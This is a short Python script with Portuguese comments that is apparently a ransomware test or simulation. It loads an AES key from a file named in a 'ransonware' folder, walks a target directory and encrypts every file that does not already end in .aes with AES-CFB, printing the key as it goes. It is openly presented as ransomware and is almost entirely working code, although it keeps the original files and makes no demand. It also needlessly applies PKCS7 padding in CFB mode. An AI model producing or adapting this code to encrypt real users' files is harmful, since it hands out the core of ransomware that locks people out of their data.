from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import os
import secrets

def read_key_from_file(file_path):
    with open(file_path, 'r') as f:
        return f.read().strip()

# Função para criptografar o arquivo
def encrypt_file(file_path, key):
    iv = secrets.token_bytes(16)  # Gerar um IV aleatório
    cipher = Cipher(algorithms.AES(bytes.fromhex(key)), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Adicionar padding ao dado se necessário
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    encrypted_data = iv + encryptor.update(padded_data) + encryptor.finalize()
    
    encrypted_file_path = file_path + '.aes'
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)
    
    print(f"Arquivo criptografado salvo em: {encrypted_file_path}")

# Caminho do diretório onde os arquivos serão processados
target_directory = os.path.expanduser("~/testandoRansonWare")

# Caminho do arquivo de chave
key_file_path = os.path.join(os.path.expanduser("~"), 'ransonware', 'key.txt')
key = read_key_from_file(key_file_path)
print(f"Chave de criptografia: {key}")

# Simulação da criptografia de arquivos
for root, dirs, files in os.walk(target_directory):
    for file in files:
        file_path = os.path.join(root, file)
        if not file.endswith(".aes"):
            encrypt_file(file_path, key)
